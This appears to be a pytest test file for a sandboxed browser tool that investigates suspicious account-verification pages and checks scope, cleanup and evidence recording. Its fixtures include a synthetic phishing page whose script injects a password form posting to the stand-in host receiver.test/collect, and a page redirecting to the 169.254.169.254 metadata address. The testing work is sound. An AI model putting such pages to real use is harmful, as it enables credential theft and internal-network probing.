"""Real browser/HTTP acceptance of reasoning-selected, stateful exploration."""

import json
import socket
import threading
import uuid
from functools import partial
from http.server import ThreadingHTTPServer
from types import SimpleNamespace
from urllib.parse import urlsplit

import pytest

import domain_investigation as cli
from browser_broker import BrowserBrokerHandler
from browser_client import investigation_request, BrowserBrokerError
from browser_guard import DestinationRefused, PinnedResponse, open_guarded_browser
from case_capture import recorded_browser
from investigation_browser import BrowserInvestigation, InvestigationManager
from research_case import assess_case, verify_case


class FixtureTransport:
    def __init__(self):
        self.requests = []

    def fetch(self, request, decision, config=None):
        self.requests.append((request.method, request.url))
        p = urlsplit(request.url)
        pages = {
            "/": '<title>Root</title><body>About this demonstration <a href="/seed">Support portal</a>',
            "/seed": """<title>Support</title><body><h1>Example support</h1>
              <a href="/docs">Read generic documentation</a>
              <a href="/portal?campaign=retain-exact-link" onclick="sessionStorage.setItem('entry','support')">Continue account verification</a>
              <a href="https://external.test/lead">External lead</a>
              <a download href="/payload.exe">Download</a>
              <details><summary>More information</summary><a href="/policy">Identity policy</a></details>""",
            "/portal": """<title>Account verification</title><body><script>
              if(sessionStorage.getItem('entry') === 'support') {
                document.body.innerHTML = '<h1>Verify Example account</h1><form action="https://receiver.test/collect" method="POST"><input type="password"></form><a href="/policy">Read who operates this service</a>';
              } else { document.body.innerHTML = '<h1>Missing session context</h1>'; }
              </script>""",
            "/policy": "<title>Operator</title><body>This demonstration is operated independently of Example.",
            "/docs": "<title>Documentation</title><body>General documentation, no account verification details.",
            "/redirect-private": '<body><script>location.href="http://169.254.169.254/latest"</script>',
        }
        pages.update(getattr(self, "overrides", {}))
        return PinnedResponse(
            200,
            {"content-type": "text/html"},
            pages.get(p.path, "<body>Fixture").encode(),
            "93.184.216.34",
        )


@pytest.fixture
def live_fixture(monkeypatch, tmp_path):
    transport = FixtureTransport()
    clients = []
    resolve = socket.getaddrinfo

    def resolver(host, *args, **kwargs):
        if not str(host).endswith(".test"):
            return resolve(host, *args, **kwargs)
        return [(socket.AF_INET, socket.SOCK_STREAM, 0, "", ("93.184.216.34", 443))]

    monkeypatch.setattr(socket, "getaddrinfo", resolver)

    def opener(url, playwright, **kwargs):
        browser = playwright.chromium.launch(headless=True)
        client = SimpleNamespace(stopped=False)
        client.start = lambda **kwargs: "fixture-" + uuid.uuid4().hex
        client.generate_ws_headers = lambda: ("fixture-only", {})
        client.stop = lambda: setattr(client, "stopped", True)
        clients.append(client)
        return open_guarded_browser(
            url,
            SimpleNamespace(
                chromium=SimpleNamespace(connect_over_cdp=lambda *a, **k: browser)
            ),
            client_factory=lambda region: client,
            transport=transport,
            **kwargs,
        )

    factory = partial(
        BrowserInvestigation, recorder_factory=partial(recorded_browser, opener=opener)
    )
    manager = InvestigationManager(factory=factory)
    server = ThreadingHTTPServer(("127.0.0.1", 0), BrowserBrokerHandler)
    server.investigation_manager = manager
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    request = partial(
        investigation_request, broker_url=f"http://127.0.0.1:{server.server_port}"
    )
    monkeypatch.setattr(
        cli,
        "_lease_path",
        lambda output: tmp_path / (output.name + "-private-lease.json"),
    )
    try:
        yield request, transport, clients
    finally:
        manager.close_all()
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)
    assert all(c.stopped for c in clients)


def review(case, output, *, hypothesis="Account verification may collect credentials"):
    cli.review(
        output,
        {
            "hypothesis": hypothesis,
            "outcome": "unresolved",
            "explanation": "Inspect the newly observed evidence before deciding the next step.",
            "evidence_ids": [case["observations"][-1]["id"]],
            "next_question": "Who operates the account verification page?",
        },
    )


def decision(case, question="Does the verification link lead to a credential form?"):
    return {
        "question": question,
        "reason": "The latest page exposes a relevant next lead.",
        "expected_signal": "The next view should identify the form or its operator.",
        "evidence_ids": [case["observations"][-1]["id"]],
    }


def test_agent_selected_link_preserves_state_and_exact_link_then_revises_hypothesis(
    live_fixture, tmp_path
):
    request, transport, clients = live_fixture
    output = tmp_path / "case"
    c = cli.start(
        output,
        "https://public.test/seed",
        "Investigate account verification and operator identity",
        request=request,
    )
    assert not c["observations"][0]["forms"]
    assert c["browser_view"]["external_leads"][0]["url"] == "https://external.test/lead"
    assert not any("payload.exe" in x["url"] for x in c["browser_view"]["choices"])
    with pytest.raises(ValueError, match="Review the latest"):
        cli.step(output, "root", decision(c), request=request)
    review(c, output)
    chosen = next(
        x for x in c["browser_view"]["choices"] if "verification" in x["text"]
    )
    c = cli.step(
        output, "follow", decision(c), candidate_id=chosen["id"], request=request
    )
    assert c["observations"][-1]["forms"][0]["fields"][0]["type"] == "password"
    assert "Missing session context" not in c["observations"][-1]["visible_text"]
    assert len(clients) == 1
    assert any(
        url.endswith("/portal?campaign=retain-exact-link")
        for _, url in transport.requests
    )
    assert "retain-exact-link" not in (output / "case.json").read_text()
    review(c, output, hypothesis="The claimed brand and actual operator may differ")
    chosen = next(x for x in c["browser_view"]["choices"] if "operates" in x["text"])
    c = cli.step(
        output,
        "follow",
        decision(c, "Does the operator match the claimed brand?"),
        candidate_id=chosen["id"],
        request=request,
    )
    assert "independently of Example" in c["observations"][-1]["visible_text"]
    review(c, output)
    with pytest.raises(ValueError, match="stopping reason"):
        assess_case(output, {"verdict": "inconclusive", "assessor": "fixture"})
    c = cli.close(
        output,
        "Observed the credential form and operator disclosure; no credentials submitted",
        request=request,
    )
    assert clients[0].stopped
    assert c["sessions"][0]["cleanup_status"] == "stopped"
    assert len({o["session_id"] for o in c["observations"]}) == 1
    c = assess_case(
        output,
        {
            "verdict": "suspicious",
            "assessor": "fixture",
            "findings": [
                {
                    "kind": "credential_collection",
                    "statement": "A password form appears after the relevant navigation.",
                    "basis": "observation",
                    "evidence_ids": ["obs-002"],
                }
            ],
            "limitations": ["Synthetic fixture, not a threat determination."],
        },
    )
    assert verify_case(output) > 6
    assert "hypothesis updates" in (output / "report.html").read_text()
    assert all(method == "GET" for method, _ in transport.requests)
    assert not json.loads(cli._lease_path(output).read_text()).get("session_token")


def test_stale_candidate_and_external_navigation_cannot_escape_scope(
    live_fixture, tmp_path
):
    request, transport, _ = live_fixture
    p = request("start", {"url": "https://public.test/seed"})
    token = p["session_token"]
    try:
        with pytest.raises(BrowserBrokerError, match="Stale"):
            request(
                "step", {"session_token": token, "view_id": "old", "action": "root"}
            )
        with pytest.raises(BrowserBrokerError, match="observed choices"):
            request(
                "step",
                {
                    "session_token": token,
                    "view_id": p["view_id"],
                    "action": "follow",
                    "candidate_id": "https://external.test/",
                },
            )
        assert not any("external.test" in url for _, url in transport.requests)
    finally:
        request("close", {"session_token": token})
    with pytest.raises(BrowserBrokerError, match="ended"):
        request(
            "step", {"session_token": token, "view_id": p["view_id"], "action": "root"}
        )


def test_browser_stops_on_private_navigation(live_fixture):
    request, transport, clients = live_fixture
    with pytest.raises(DestinationRefused):
        request(
            "start",
            {
                "url": "https://public.test/redirect-private",
                "scope": "observed_external",
            },
        )
    assert clients[0].stopped
    assert not any("169.254.169.254" in url for _, url in transport.requests)


def test_disclosure_root_back_and_profile_branch(live_fixture, tmp_path):
    request, _, clients = live_fixture
    output = tmp_path / "branch"
    c = cli.start(
        output,
        "https://public.test/seed",
        "Investigate links and disclosure",
        request=request,
    )
    review(c, output)
    choice = next(x for x in c["browser_view"]["choices"] if x["action"] == "expand")
    c = cli.step(
        output, "expand", decision(c), candidate_id=choice["id"], request=request
    )
    assert any(x["text"] == "Identity policy" for x in c["browser_view"]["choices"])
    review(c, output)
    c = cli.step(output, "root", decision(c), request=request)
    assert "About this demonstration" in c["observations"][-1]["visible_text"]
    review(c, output)
    c = cli.step(output, "back", decision(c), request=request)
    assert c["observations"][-1]["final_url"] == "https://public.test/seed"
    review(c, output)
    c = cli.profile(output, "mobile", decision(c), request=request)
    assert len(clients) == 2 and clients[0].stopped
    assert c["observations"][-1]["profile"] == "mobile"
    cli.close(output, "Both contexts examined", request=request)
    assert all(client.stopped for client in clients)


def test_step_budget_closes_context(live_fixture, monkeypatch):
    import investigation_browser

    monkeypatch.setattr(investigation_browser, "MAX_STEPS", 3)
    request, _, clients = live_fixture
    p = request("start", {"url": "https://public.test/seed"})
    token = p["session_token"]
    for action in ("root", "back"):
        p = request(
            "step", {"session_token": token, "view_id": p["view_id"], "action": action}
        )
    assert p["steps_used"] == 3 and not p["session_open"]
    assert p["manifest"]["cleanup_status"] == "stopped" and clients[0].stopped
    with pytest.raises(BrowserBrokerError, match="ended"):
        request(
            "step", {"session_token": token, "view_id": p["view_id"], "action": "root"}
        )


def test_unconfirmed_start_is_retained_and_allows_only_inconclusive(tmp_path):
    output = tmp_path / "unknown"

    def unavailable(operation, payload):
        raise BrowserBrokerError("No response; startup outcome is unknown")

    with pytest.raises(BrowserBrokerError):
        cli.start(
            output, "https://public.test/", "Inspect the domain", request=unavailable
        )
    c = json.loads((output / "case.json").read_text())
    assert c["unconfirmed_browser_start"] and c["probes"][0]["status"] == "failed"
    cli.close(
        output,
        "Startup outcome unknown; service lease is the cleanup backstop",
        request=unavailable,
    )
    with pytest.raises(ValueError, match="cleanup"):
        assess_case(output, {"verdict": "suspicious", "assessor": "fixture"})
    c = assess_case(
        output,
        {
            "verdict": "inconclusive",
            "assessor": "fixture",
            "limitations": ["Startup outcome unknown"],
        },
    )
    assert c["assessment"]["verdict"] == "inconclusive"


def test_failed_profile_start_does_not_claim_previous_context_cleanup(
    live_fixture, tmp_path
):
    request, _, clients = live_fixture
    output = tmp_path / "failed-branch"
    c = cli.start(
        output,
        "https://public.test/seed",
        "Investigate profile variation",
        request=request,
    )
    review(c, output)

    def failed_start(operation, payload):
        if operation == "start":
            raise BrowserBrokerError("Startup outcome unknown")
        return request(operation, payload)

    with pytest.raises(BrowserBrokerError):
        cli.profile(output, "mobile", decision(c), request=failed_start)
    c = json.loads((output / "case.json").read_text())
    assert clients[0].stopped and c["sessions"][0]["cleanup_status"] == "stopped"
    assert c["unconfirmed_browser_start"]
    with pytest.raises(ValueError, match="cleanup"):
        assess_case(
            output,
            {
                "verdict": "suspicious",
                "assessor": "fixture",
                "findings": [
                    {
                        "kind": "other",
                        "basis": "observation",
                        "statement": "Known prior observation",
                        "evidence_ids": ["obs-001"],
                    }
                ],
            },
        )


def test_explicit_external_scope_follows_observed_lead(live_fixture):
    request, transport, clients = live_fixture
    p = request(
        "start", {"url": "https://public.test/seed", "scope": "observed_external"}
    )
    token = p["session_token"]
    try:
        choice = next(
            c for c in p["choices"] if c["url"] == "https://external.test/lead"
        )
        p = request(
            "step",
            {
                "session_token": token,
                "view_id": p["view_id"],
                "action": "follow",
                "candidate_id": choice["id"],
            },
        )
        assert p["observations"][-1]["final_url"] == "https://external.test/lead"
        assert any(url == "https://external.test/lead" for _, url in transport.requests)
    finally:
        request("close", {"session_token": token})
    assert clients[0].stopped


def test_idle_lease_expires_without_another_agent_action(live_fixture, monkeypatch):
    import time
    import investigation_browser

    monkeypatch.setattr(investigation_browser, "LEASE_SECONDS", 3)
    request, _, clients = live_fixture
    p = request("start", {"url": "https://public.test/seed"})
    deadline = time.monotonic() + 5
    while not clients[0].stopped and time.monotonic() < deadline:
        time.sleep(0.05)
    assert clients[0].stopped
    result = request("close", {"session_token": p["session_token"]})
    assert result["cleanup_status"] == "stopped"
    with pytest.raises(BrowserBrokerError, match="ended"):
        request(
            "step",
            {
                "session_token": p["session_token"],
                "view_id": p["view_id"],
                "action": "root",
            },
        )


def test_close_queued_at_expiry_gets_the_known_cleanup_result():
    from concurrent.futures import Future
    from investigation_browser import _Actor

    entered = threading.Event()
    release = threading.Event()

    class Browser:
        closed = False
        last = {"fixture": True}

        def pump(self):
            entered.set()
            release.wait(timeout=5)

        def close(self):
            self.closed = True
            return {
                "session_id": "expiry-fixture",
                "cleanup_status": "stopped",
                "session_open": False,
            }

    actor = _Actor({}, lambda payload, playwright: Browser(), lambda actor: None)
    try:
        actor.ready.result(timeout=10)
        assert entered.wait(timeout=5)
        future = Future()
        actor.inbox.put_nowait(({"action": "close"}, future))
        actor.deadline = 0
        release.set()
        assert future.result(timeout=5)["cleanup_status"] == "stopped"
    finally:
        release.set()
        actor.deadline = 0
        actor.thread.join(timeout=5)


def test_selected_new_window_link_reuses_context_and_records_adaptation(
    live_fixture, tmp_path
):
    request, transport, clients = live_fixture
    transport.overrides = {
        "/seed": '<title>Support</title><body><a target="_blank" href="/portal" onclick="sessionStorage.setItem(\'entry\',\'support\')">Verify account</a>'
    }
    output = tmp_path / "new-window"
    c = cli.start(
        output,
        "https://public.test/seed",
        "Inspect the verification flow",
        request=request,
    )
    review(c, output)
    chosen = c["browser_view"]["choices"][0]
    c = cli.step(
        output, "follow", decision(c), candidate_id=chosen["id"], request=request
    )
    assert c["observations"][-1]["forms"]
    assert c["observations"][-1]["interaction"]["target_rewritten_to_self"]
    assert len(clients) == 1
    cli.close(output, "Selected link inspected in the guarded context", request=request)
